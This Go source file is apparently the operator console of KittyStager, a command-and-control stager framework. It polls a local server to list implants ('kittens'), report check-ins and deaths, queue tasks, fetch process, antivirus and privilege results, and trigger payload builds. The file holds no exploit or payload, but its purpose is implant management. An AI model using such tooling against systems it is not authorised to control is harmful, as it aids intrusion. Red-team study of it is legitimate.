package cli

import (
	"KittyStager/internal/config"
	"KittyStager/internal/kitten"
	"KittyStager/internal/task"
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/inancgumus/screen"
	color "github.com/logrusorgru/aurora"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	exit    bool
	host    string
	kittens map[string]*kitten.Kitten
)

func init() {
	host = "http://127.0.0.1:1337"
}

var mutex = &sync.Mutex{}

func GetConfig() (*config.Config, error) {
	var conf *config.Config
	b, err := GetRequest(fmt.Sprintf("%s/conf", host))
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(b, &conf)
	return conf, nil
}

func GetKittens() (map[string]*kitten.Kitten, error) {
	kittens = make(map[string]*kitten.Kitten)
	b, err := GetRequest(fmt.Sprintf("%s/kittensList", host))
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(b, &kittens)
	return kittens, nil
}

func getKitten(name string) (*kitten.Kitten, error) {
	kittens, err := GetKittens()
	if err != nil {
		return nil, err
	}
	k := kittens[name]
	return k, nil
}

func printLogs() error {
	go exitLogs()
	exit = false
	for {
		screen.Clear()
		screen.MoveTopLeft()
		b, err := GetRequest(fmt.Sprintf("%s/logs", host))
		if err != nil {
			return err
		}
		fmt.Println(string(b))
		fmt.Println("Type q to exit")
		if exit {
			screen.Clear()
			screen.MoveTopLeft()
			return nil
		}
		time.Sleep(1 * time.Second)
	}
}

func exitLogs() {
	consoleReader := bufio.NewReaderSize(os.Stdin, 1)
	for {
		input, _ := consoleReader.ReadByte()
		ascii := input
		if ascii == 113 {
			exit = true
			return
		}
	}
}

func CreateTask(task *task.Task, name string) error {
	fmt.Printf("%s %s\n", color.BrightGreen("[*] New job created for"), color.BrightGreen(name))
	marshalledTask, err := task.MarshallTask()
	if err != nil {
		return err
	}
	_, err = postRequest(marshalledTask, fmt.Sprintf("%s/task/%s", host, name))
	if err != nil {
		return err
	}
	return nil
}

func GetTask(name string) ([]*task.Task, error) {
	var t []*task.Task
	b, err := GetRequest(fmt.Sprintf("%s/task/%s", host, name))
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(b, &t)
	return t, nil
}

func GetRequest(url string) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return body, err
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

func postRequest(content []byte, url string) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(content))
	if err != nil {
		return body, err
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

func checkForResponse(name string) error {
	t := task.NewTask("", nil)
	var b []byte
	var err error
	for {
		b, err = GetRequest(fmt.Sprintf("%s/result/%s", host, name))
		if err != nil {
			return err
		}
		if string(b) != "null" {
			break
		}
		time.Sleep(1 * time.Second)
	}
	err = t.UnmarshallTask(b)
	if err != nil {
		return err
	}
	switch t.Tag {
	case "ps":
		pid := kittens[name].Recon.Pid
		err = printPS(t, pid)
		if err != nil {
			return err
		}
	case "av":
		printAV(t)
	case "priv":
		printPriv(t)
	}
	return nil
}

func checkAlive(name string) error {

	for {
		mutex.Lock()
		i, err := getKitten(name)
		mutex.Unlock()
		if err != nil {
			return err
		}
		if !i.GetAlive() {
			fmt.Printf("\n%s%s%s\n", color.BrightRed("[!] Kitten "), color.BrightRed(name), color.BrightRed(" died..."))
			return nil
		}
		time.Sleep(1 * time.Second)
	}
}

func checkConn() {
	for {
		_, err := GetRequest(host)
		if err != nil {
			fmt.Printf("\n%s\n", color.BrightRed("[!] Unable to connect to the server"))
		}
		time.Sleep(1 * time.Second)
	}
}

func checkKitten() {
	// mutex is used to block all other go routine do access this func
	mutex.Lock()
	k, err := GetKittens()
	mutex.Unlock()
	if err != nil {
		return
	}
	s := len(k)
	for {
		mutex.Lock()
		newKitten, err := GetKittens()
		mutex.Unlock()
		if err != nil {
			return
		}
		if len(newKitten) > s {
			for i := range newKitten {
				_, ok := k[i]
				if !ok && i != "" {
					fmt.Printf("\n%s %s %s\n", color.BrightGreen("[*] New Kitten"), color.BrightWhite(i), color.BrightGreen("checked-in."))
				}
			}
			mutex.Lock()
			k, _ = GetKittens()
			mutex.Unlock()
		}
		time.Sleep(2 * time.Second)
	}
}

func Build() error {
	_, err := GetRequest(fmt.Sprintf("%s/build", host))
	if err != nil {
		return err
	}
	return err
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if strings.Contains(strings.ToLower(str), v) {
			return true
		}
	}
	return false
}
